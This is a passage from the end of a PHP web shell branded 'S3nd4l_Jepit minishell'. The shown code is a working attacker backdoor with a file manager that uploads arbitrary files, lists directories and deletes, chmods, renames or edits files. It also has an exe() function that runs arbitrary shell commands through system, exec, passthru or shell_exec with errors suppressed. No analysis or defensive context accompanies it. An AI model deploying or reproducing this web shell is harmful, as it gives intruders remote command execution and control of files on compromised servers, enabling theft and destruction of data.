echo '<font color="#FFFFFF">Files deleted!</font><br/>';
}else{
echo '<font color="#FF2E00">Failed to delete files :(</font><br/>';
}
}
}
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="#FFFFFF">Uploaded!</font><br />';
}else{
echo '<font color="#FF2E00">Not uploaded :(</font><br/>';
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="850" border="0" cellpadding="2" cellspacing="1" align="center">
<tr class="first">
<td><center>NAME</center></td>
<td><center>SIZE</center></td>
<td><center>PERMISSION</center></td>
<td><center>MODIFY</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="#FFFFFF">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="FF2E00">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option selected>Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="#FFFFFF">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="FF2E00">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option selected>Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';}
echo '</table>
</div>';}
echo '<center><br><a class=S3nd4l href=https://github.com/cowokumel/s3nd4ljepit-minishell>&copy; S3nd4l_Jepit</a></center>
</body>
</html>';
function exe($cmd) {
        if(function_exists('system')) {
            @ob_start();
            @system($cmd);
            $buff =@ob_get_contents();
            @ob_end_clean();
            return $buff;
        } elseif(function_exists('exec')) {
            @exec($cmd,$results);
            $buff = "";
            foreach($results as $result) {
                $buff .= $result;
            } return $buff;
        } elseif(function_exists('passthru')) {
            @ob_start();
            @passthru($cmd);
            $buff = @ob_get_contents();
            @ob_end_clean();
            return $buff;
        } elseif(function_exists('shell_exec')) {
            $buff = @shell_exec($cmd);
            return $buff;
        }
    }
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
$info = 'p';
} else {
$info = 'u';
}

$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
